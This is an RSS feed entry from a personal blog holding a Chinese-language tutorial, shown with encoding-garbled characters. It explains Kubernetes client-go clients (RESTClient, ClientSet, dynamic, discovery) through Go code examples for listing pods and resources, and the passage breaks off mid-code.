<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on shank</title>
		<link>https://shankisme.com/posts/</link>
		<description>Recent content in Posts on shank</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>en-us</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Mon, 13 Dec 2021 15:35:21 +0800</lastBuildDate>
		<atom:link href="https://shankisme.com/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>é¢å‘API server CRUDçš„æ¢ç´¢</title>
			<link>https://shankisme.com/posts/clientset/</link>
			<pubDate>Mon, 13 Dec 2021 15:35:21 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/clientset/</guid>
			<description>å‰è¨€ æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¸éœ€è¦operatorçš„é‚£ç§è¿ç»´èƒ½åŠ›ï¼Œèƒ½å¯¹èµ„æºCRUDå°±å¤Ÿäº†ï¼Œclient-goä¸­çš„clientå°±æ˜¯éå¸¸ä¸é”™çš„é€‰æ‹©ã€‚
å‰ç½®çŸ¥è¯† GVRã€GVK åœ¨æ•´ä¸ªkubernetesæ¶æ„ä¸­ï¼Œèµ„æºæ˜¯æœ€é‡è¦çš„æ¦‚å¿µï¼Œå¯ä»¥è¯´k8sçš„ç”Ÿæ€ç³»ç»Ÿéƒ½å›´ç»•èµ„æºè¿ä½œï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªèµ„æºæ§åˆ¶ç³»ç»Ÿï¼šæ³¨å†Œã€ç®¡ç†ã€è°ƒåº¦èµ„æºå¹¶ç»´æŠ¤èµ„æºçŠ¶æ€ã€‚
k8så°†èµ„æºåˆ†ç»„å’Œç‰ˆæœ¬åŒ–ï¼Œå½¢æˆäº†:
 Group: èµ„æºç»„ Version: èµ„æºç‰ˆæœ¬ Resource: èµ„æº Kind: èµ„æºç§ç±», ä¸resourceä¸ºåŒçº§æ¦‚å¿µ  k8sç³»ç»Ÿæ”¯æŒå¤šä¸ªGroupï¼Œæ¯ä¸ªGroupæ”¯æŒå¤šä¸ªVersionï¼Œæ¯ä¸ªVersionæ”¯æŒå¤šä¸ªResourceï¼Œå…¶ä¸­éƒ¨åˆ†èµ„æºä¼šæ‹¥æœ‰å­èµ„æºï¼Œå¦‚Deploymentä¼šæ‹¥æœ‰Statuså­èµ„æºã€‚
èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºã€å­èµ„æºçš„å®Œæ•´è¡¨ç°å½¢å¼ä¸ºï¼š&amp;lt;group&amp;gt;/&amp;lt;version&amp;gt;/&amp;lt;resource&amp;gt;/&amp;lt;subresource&amp;gt;
å¦‚Deploymentèµ„æºï¼Œå®Œæ•´è¡¨ç°å½¢å¼ä¸ºï¼šapps/v1/deployments/status
èµ„æºå®ä¾‹åŒ–åä¸ºä¸€ä¸ªèµ„æºå¯¹è±¡ï¼Œæ‹¥æœ‰èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºç§ç±»ï¼Œè¡¨ç°å½¢å¼ä¸ºï¼š&amp;lt;group&amp;gt;/&amp;lt;version&amp;gt;,Kind=&amp;lt;kind&amp;gt;
å¦‚Deployment, å®Œæ•´è¡¨ç°å½¢å¼ä¸ºapps/v1,Kind=Deployment
client-go k8sä½¿ç”¨client-goä½œä¸ºgoè¯­è¨€å®˜æ–¹ç¼–ç¨‹å¼äº¤äº’å®¢æˆ·ç«¯åº“ï¼Œæä¾›å¯¹k8s API serverçš„äº¤äº’å¼è®¿é—®ã€‚
client-goæ”¯æŒ4ç§clientå¯¹è±¡ä¸k8säº¤äº’ï¼Œåˆ†åˆ«æ˜¯ClientSetã€DynamicClientã€DiscoveryClientã€RESTClient
RESTClientæœ€åŸºç¡€ï¼Œå®ƒå°è£…äº†HTTPRequest,å®ç°äº†RESTfulé£æ ¼çš„APIï¼ŒClientSetã€DynamicClinetä»¥åŠDiscoveryClientéƒ½æ˜¯åŸºäºRESTfulClientå®ç°çš„ã€‚
 RESTClient package main import ( &amp;#34;context&amp;#34; &amp;#34;fmt&amp;#34; corev1 &amp;#34;k8s.io/api/core/v1&amp;#34; metav1 &amp;#34;k8s.io/apimachinery/pkg/apis/meta/v1&amp;#34; &amp;#34;k8s.io/client-go/kubernetes/scheme&amp;#34; &amp;#34;k8s.io/client-go/rest&amp;#34; &amp;#34;k8s.io/client-go/tools/clientcmd&amp;#34; ) func main() { config, err := clientcmd.BuildConfigFromFlags(&amp;#34;&amp;#34;, &amp;#34;/etc/rancher/k3s/k3s.yaml&amp;#34;) if err != nil { panic(err) } config.APIPath = &amp;#34;api&amp;#34; // group core version v1 	config.GroupVersion = &amp;amp;corev1.</description>
			<content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>æŸäº›åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½ä¸éœ€è¦operatorçš„é‚£ç§è¿ç»´èƒ½åŠ›ï¼Œèƒ½å¯¹èµ„æºCRUDå°±å¤Ÿäº†ï¼Œclient-goä¸­çš„clientå°±æ˜¯éå¸¸ä¸é”™çš„é€‰æ‹©ã€‚</p>
<h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h2>
<h3 id="gvrgvk">GVRã€GVK</h3>
<p>åœ¨æ•´ä¸ªkubernetesæ¶æ„ä¸­ï¼Œèµ„æºæ˜¯æœ€é‡è¦çš„æ¦‚å¿µï¼Œå¯ä»¥è¯´k8sçš„ç”Ÿæ€ç³»ç»Ÿéƒ½å›´ç»•èµ„æºè¿ä½œï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªèµ„æºæ§åˆ¶ç³»ç»Ÿï¼šæ³¨å†Œã€ç®¡ç†ã€è°ƒåº¦èµ„æºå¹¶ç»´æŠ¤èµ„æºçŠ¶æ€ã€‚</p>
<p>k8så°†èµ„æºåˆ†ç»„å’Œç‰ˆæœ¬åŒ–ï¼Œå½¢æˆäº†:</p>
<ul>
<li><code>Group</code>: èµ„æºç»„</li>
<li><code>Version</code>: èµ„æºç‰ˆæœ¬</li>
<li><code>Resource</code>: èµ„æº</li>
<li><code>Kind</code>: èµ„æºç§ç±», ä¸resourceä¸ºåŒçº§æ¦‚å¿µ</li>
</ul>
<p>k8sç³»ç»Ÿæ”¯æŒå¤šä¸ªGroupï¼Œæ¯ä¸ªGroupæ”¯æŒå¤šä¸ªVersionï¼Œæ¯ä¸ªVersionæ”¯æŒå¤šä¸ªResourceï¼Œå…¶ä¸­éƒ¨åˆ†èµ„æºä¼šæ‹¥æœ‰å­èµ„æºï¼Œå¦‚Deploymentä¼šæ‹¥æœ‰Statuså­èµ„æºã€‚</p>
<p>èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºã€å­èµ„æºçš„å®Œæ•´è¡¨ç°å½¢å¼ä¸ºï¼š&lt;group&gt;/&lt;version&gt;/&lt;resource&gt;/&lt;subresource&gt;</p>
<p>å¦‚Deploymentèµ„æºï¼Œå®Œæ•´è¡¨ç°å½¢å¼ä¸ºï¼šapps/v1/deployments/status</p>
<p>èµ„æºå®ä¾‹åŒ–åä¸ºä¸€ä¸ªèµ„æºå¯¹è±¡ï¼Œæ‹¥æœ‰èµ„æºç»„ã€èµ„æºç‰ˆæœ¬ã€èµ„æºç§ç±»ï¼Œè¡¨ç°å½¢å¼ä¸ºï¼š&lt;group&gt;/&lt;version&gt;,Kind=&lt;kind&gt;</p>
<p>å¦‚Deployment, å®Œæ•´è¡¨ç°å½¢å¼ä¸ºapps/v1,Kind=Deployment</p>
<h2 id="client-go">client-go</h2>
<p>k8sä½¿ç”¨client-goä½œä¸ºgoè¯­è¨€å®˜æ–¹ç¼–ç¨‹å¼äº¤äº’å®¢æˆ·ç«¯åº“ï¼Œæä¾›å¯¹k8s API serverçš„äº¤äº’å¼è®¿é—®ã€‚</p>
<p>client-goæ”¯æŒ4ç§clientå¯¹è±¡ä¸k8säº¤äº’ï¼Œåˆ†åˆ«æ˜¯ClientSetã€DynamicClientã€DiscoveryClientã€RESTClient</p>
<p>RESTClientæœ€åŸºç¡€ï¼Œå®ƒå°è£…äº†HTTPRequest,å®ç°äº†RESTfulé£æ ¼çš„APIï¼ŒClientSetã€DynamicClinetä»¥åŠDiscoveryClientéƒ½æ˜¯åŸºäºRESTfulClientå®ç°çš„ã€‚</p>
<figure><img src="/img/clientset/clients.png"
         alt="image"/>
</figure>

<h3 id="restclient">RESTClient</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;context&#34;</span>
	<span class="s">&#34;fmt&#34;</span>

	<span class="nx">corev1</span> <span class="s">&#34;k8s.io/api/core/v1&#34;</span>
	<span class="nx">metav1</span> <span class="s">&#34;k8s.io/apimachinery/pkg/apis/meta/v1&#34;</span>
	<span class="s">&#34;k8s.io/client-go/kubernetes/scheme&#34;</span>
	<span class="s">&#34;k8s.io/client-go/rest&#34;</span>
	<span class="s">&#34;k8s.io/client-go/tools/clientcmd&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">config</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">clientcmd</span><span class="p">.</span><span class="nf">BuildConfigFromFlags</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;/etc/rancher/k3s/k3s.yaml&#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">config</span><span class="p">.</span><span class="nx">APIPath</span> <span class="p">=</span> <span class="s">&#34;api&#34;</span>
	<span class="c1">// group core version v1
</span><span class="c1"></span>	<span class="nx">config</span><span class="p">.</span><span class="nx">GroupVersion</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">corev1</span><span class="p">.</span><span class="nx">SchemeGroupVersion</span>
	<span class="c1">// set codec
</span><span class="c1"></span>	<span class="nx">config</span><span class="p">.</span><span class="nx">NegotiatedSerializer</span> <span class="p">=</span> <span class="nx">scheme</span><span class="p">.</span><span class="nx">Codecs</span>
	
	<span class="nx">restClient</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">rest</span><span class="p">.</span><span class="nf">RESTClientFor</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">result</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">corev1</span><span class="p">.</span><span class="nx">PodList</span><span class="p">{}</span>

	<span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">()</span>

	<span class="nx">err</span> <span class="p">=</span> <span class="nx">restClient</span><span class="p">.</span><span class="nf">Get</span><span class="p">().</span>
		<span class="nf">Namespace</span><span class="p">(</span><span class="s">&#34;default&#34;</span><span class="p">).</span>
		<span class="nf">Resource</span><span class="p">(</span><span class="s">&#34;pods&#34;</span><span class="p">).</span>
		<span class="nf">VersionedParams</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">metav1</span><span class="p">.</span><span class="nx">ListOptions</span><span class="p">{</span><span class="nx">Limit</span><span class="p">:</span> <span class="mi">10</span><span class="p">},</span> <span class="nx">scheme</span><span class="p">.</span><span class="nx">ParameterCodec</span><span class="p">).</span>
		<span class="nf">Do</span><span class="p">(</span><span class="nx">ctx</span><span class="p">).</span>
		<span class="nf">Into</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>

	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">pod</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">result</span><span class="p">.</span><span class="nx">Items</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">pod</span><span class="p">.</span><span class="nx">Namespace</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Status</span><span class="p">.</span><span class="nx">Phase</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h3 id="clientset">clientset</h3>
<p>ClientSetåœ¨RESTClientåŸºç¡€ä¸Šå°è£…äº†Resourceç®¡ç†æ–¹æ³•, æ¯ä¸ªResourceå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªèµ„æºcrudçš„å®¢æˆ·ç«¯ï¼Œè€ŒClientSetæ˜¯å¤šä¸ªå®¢æˆ·ç«¯é›†åˆï¼Œåœ¨ä½¿ç”¨å‰éœ€è¦çŸ¥é“è¦æ“ä½œèµ„æºçš„Group, Versionã€‚éœ€è¦æ³¨æ„ï¼Œclientsetä»…èƒ½è®¿é—®k8så†…ç½®èµ„æºï¼Œæ— æ³•è®¿é—®è‡ªå®šä¹‰èµ„æºCRDï¼Œå¦‚éœ€è®¿é—®CRDï¼Œéœ€è¦ä½¿ç”¨ä»£ç ç”Ÿæˆå™¨é‡æ–°ç”Ÿæˆclientsetã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;context&#34;</span>
	<span class="s">&#34;fmt&#34;</span>

	<span class="nx">metav1</span> <span class="s">&#34;k8s.io/apimachinery/pkg/apis/meta/v1&#34;</span>
	<span class="s">&#34;k8s.io/client-go/kubernetes&#34;</span>
	<span class="s">&#34;k8s.io/client-go/tools/clientcmd&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">config</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">clientcmd</span><span class="p">.</span><span class="nf">BuildConfigFromFlags</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;/etc/rancher/k3s/k3s.yaml&#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">clientset</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">kubernetes</span><span class="p">.</span><span class="nf">NewForConfig</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">()</span>
	<span class="c1">// all namepsaces pods
</span><span class="c1"></span>	<span class="nx">podClient</span> <span class="o">:=</span> <span class="nx">clientset</span><span class="p">.</span><span class="nf">CoreV1</span><span class="p">().</span><span class="nf">Pods</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">)</span>
	<span class="nx">list</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">podClient</span><span class="p">.</span><span class="nf">List</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">ListOptions</span><span class="p">{})</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">pod</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">list</span><span class="p">.</span><span class="nx">Items</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">pod</span><span class="p">.</span><span class="nx">Namespace</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Status</span><span class="p">.</span><span class="nx">Phase</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h3 id="dynamic-client">dynamic client</h3>
<p>dynamic clientæ˜¯ä¸€ç§åŠ¨æ€å®¢æˆ·ç«¯ï¼Œå’Œclientsetæœ€å¤§çš„åŒºåˆ«æ˜¯ï¼šclientsetä¸èƒ½æ“ä½œè‡ªå®šä¹‰èµ„æºï¼Œä½†dynamic clientå¯ä»¥ï¼Œè¿™æ˜¯å› ä¸ºdynamic clientå†…éƒ¨ä½¿ç”¨éç»“æ„åŒ–æ•°æ®unstructuredï¼Œè¯¥æ•°æ®ç»“æ„èƒ½ä¸resourceäº’è½¬ã€‚</p>
<p>åŒæ—¶ï¼Œdynamic clientæœ‰å¯¹åº”çš„dynamic informerå®ç°ï¼Œå› æ­¤åœ¨æŸ¥è¯¢æ—¶å¯ä»¥ä»æœ¬åœ°å†…å­˜ç¼“å­˜è·å–èµ„æºä¿¡æ¯ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;context&#34;</span>
	<span class="s">&#34;fmt&#34;</span>

	<span class="nx">corev1</span> <span class="s">&#34;k8s.io/api/core/v1&#34;</span>
	<span class="nx">metav1</span> <span class="s">&#34;k8s.io/apimachinery/pkg/apis/meta/v1&#34;</span>
	<span class="s">&#34;k8s.io/apimachinery/pkg/runtime&#34;</span>
	<span class="s">&#34;k8s.io/apimachinery/pkg/runtime/schema&#34;</span>
	<span class="s">&#34;k8s.io/client-go/dynamic&#34;</span>
	<span class="s">&#34;k8s.io/client-go/tools/clientcmd&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">config</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">clientcmd</span><span class="p">.</span><span class="nf">BuildConfigFromFlags</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;/etc/rancher/k3s/k3s.yaml&#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">dynamicClient</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">dynamic</span><span class="p">.</span><span class="nf">NewForConfig</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">()</span>
	<span class="nx">gvr</span> <span class="o">:=</span> <span class="nx">schema</span><span class="p">.</span><span class="nx">GroupVersionResource</span><span class="p">{</span><span class="nx">Version</span><span class="p">:</span> <span class="s">&#34;v1&#34;</span><span class="p">,</span> <span class="nx">Resource</span><span class="p">:</span> <span class="s">&#34;pods&#34;</span><span class="p">}</span>
	<span class="c1">// all namespaces
</span><span class="c1"></span>	<span class="nx">unstructuredObjs</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">dynamicClient</span><span class="p">.</span><span class="nf">Resource</span><span class="p">(</span><span class="nx">gvr</span><span class="p">).</span><span class="nf">Namespace</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">).</span><span class="nf">List</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">ListOptions</span><span class="p">{})</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">podList</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">corev1</span><span class="p">.</span><span class="nx">PodList</span><span class="p">{}</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">runtime</span><span class="p">.</span><span class="nx">DefaultUnstructuredConverter</span><span class="p">.</span><span class="nf">FromUnstructured</span><span class="p">(</span><span class="nx">unstructuredObjs</span><span class="p">.</span><span class="nf">UnstructuredContent</span><span class="p">(),</span> <span class="nx">podList</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>
	
	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">pod</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">podList</span><span class="p">.</span><span class="nx">Items</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">pod</span><span class="p">.</span><span class="nx">Namespace</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Status</span><span class="p">.</span><span class="nx">Phase</span><span class="p">)</span>
	<span class="p">}</span>
<span class="p">}</span>

</code></pre></div><h3 id="discovery-client">discovery client</h3>
<p>discovery clientæ˜¯ä¸€ä¸ªå¸¦ç¼“å­˜çš„èµ„æºå‘ç°å®¢æˆ·ç«¯ï¼Œä¸»è¦ç”¨äºå‘ç°API serveræ”¯æŒçš„GVRï¼Œç¼“å­˜ä¿¡æ¯é»˜è®¤å­˜å‚¨äº<code>~/.kube/cache</code>å’Œ<code>~/.kube/http-cacheä¸­</code>ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// list resource
</span><span class="c1"></span>
<span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;fmt&#34;</span>

	<span class="s">&#34;k8s.io/apimachinery/pkg/runtime/schema&#34;</span>
	<span class="s">&#34;k8s.io/client-go/discovery&#34;</span>
	<span class="s">&#34;k8s.io/client-go/tools/clientcmd&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">config</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">clientcmd</span><span class="p">.</span><span class="nf">BuildConfigFromFlags</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;/etc/rancher/k3s/k3s.yaml&#34;</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">discoveryClient</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">discovery</span><span class="p">.</span><span class="nf">NewDiscoveryClientForConfig</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">_</span><span class="p">,</span> <span class="nx">APIResourceLIst</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">discovery</span><span class="p">.</span><span class="nf">ServerGroupsAndResources</span><span class="p">(</span><span class="nx">discoveryClient</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">list</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">APIResourceLIst</span> <span class="p">{</span>
		<span class="nx">gv</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">schema</span><span class="p">.</span><span class="nf">ParseGroupVersion</span><span class="p">(</span><span class="nx">list</span><span class="p">.</span><span class="nx">GroupVersion</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>

		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">resource</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">list</span><span class="p">.</span><span class="nx">APIResources</span> <span class="p">{</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">resource</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span> <span class="nx">gv</span><span class="p">.</span><span class="nx">Group</span><span class="p">,</span> <span class="nx">gv</span><span class="p">.</span><span class="nx">Version</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h2 id="best-practice">best practice</h2>
<p>é€šå¸¸ï¼Œ æˆ‘ä»¬åœ¨è®¾è®¡è‡ªå·±çš„ç¨‹åºæ—¶ï¼Œæ—¢æƒ³ç”¨discovery clientçš„èµ„æºå‘ç°èƒ½åŠ›ï¼Œä¹Ÿæƒ³æ‹¥æœ‰dynamic clientå¯¹å†…ç½®èµ„æºå’Œè‡ªå®šä¹‰èµ„æºä¸€è‡´çš„ç®¡ç†èƒ½åŠ›ï¼Œä½¿ç”¨RESTmapperå¯ä»¥å°†ä¸¤è€…ç»“åˆèµ·æ¥ï¼š</p>
<ul>
<li>restmapperå€ŸåŠ©discovery clientï¼Œå®ç°GVKæ˜ å°„GVRï¼Œè‹¥èµ„æºä¸å­˜åœ¨æ˜ å°„å¤±è´¥</li>
<li>dynamic clientä½¿ç”¨è·å–çš„GVRå‘API serveræŸ¥è¯¢</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="p">(</span>
	<span class="s">&#34;context&#34;</span>
	<span class="s">&#34;fmt&#34;</span>
	<span class="s">&#34;log&#34;</span>
	<span class="s">&#34;os&#34;</span>
	<span class="s">&#34;sync&#34;</span>

	<span class="nx">corev1</span> <span class="s">&#34;k8s.io/api/core/v1&#34;</span>
	<span class="s">&#34;k8s.io/apimachinery/pkg/api/meta&#34;</span>
	<span class="nx">metav1</span> <span class="s">&#34;k8s.io/apimachinery/pkg/apis/meta/v1&#34;</span>
	<span class="s">&#34;k8s.io/apimachinery/pkg/apis/meta/v1/unstructured&#34;</span>
	<span class="s">&#34;k8s.io/apimachinery/pkg/runtime&#34;</span>
	<span class="s">&#34;k8s.io/apimachinery/pkg/runtime/schema&#34;</span>
	<span class="s">&#34;k8s.io/client-go/discovery&#34;</span>
	<span class="s">&#34;k8s.io/client-go/discovery/cached/memory&#34;</span>
	<span class="s">&#34;k8s.io/client-go/dynamic&#34;</span>
	<span class="s">&#34;k8s.io/client-go/restmapper&#34;</span>
	<span class="s">&#34;k8s.io/client-go/tools/clientcmd&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
	<span class="nf">mustInitClient</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="p">(</span>
	<span class="nx">discoveryClient</span> <span class="o">*</span><span class="nx">discovery</span><span class="p">.</span><span class="nx">DiscoveryClient</span>
	<span class="nx">dynamicClient</span>   <span class="nx">dynamic</span><span class="p">.</span><span class="nx">Interface</span>
	<span class="nx">once</span>            <span class="nx">sync</span><span class="p">.</span><span class="nx">Once</span>

	<span class="nx">gvk</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">schema</span><span class="p">.</span><span class="nx">GroupVersionKind</span><span class="p">{</span>
		<span class="nx">Version</span><span class="p">:</span> <span class="s">&#34;v1&#34;</span><span class="p">,</span>
		<span class="nx">Kind</span><span class="p">:</span>    <span class="s">&#34;Pod&#34;</span><span class="p">,</span>
	<span class="p">}</span>
	<span class="nx">namespace</span> <span class="p">=</span> <span class="s">&#34;default&#34;</span>
<span class="p">)</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">ctx</span> <span class="o">:=</span> <span class="nx">context</span><span class="p">.</span><span class="nf">Background</span><span class="p">()</span>
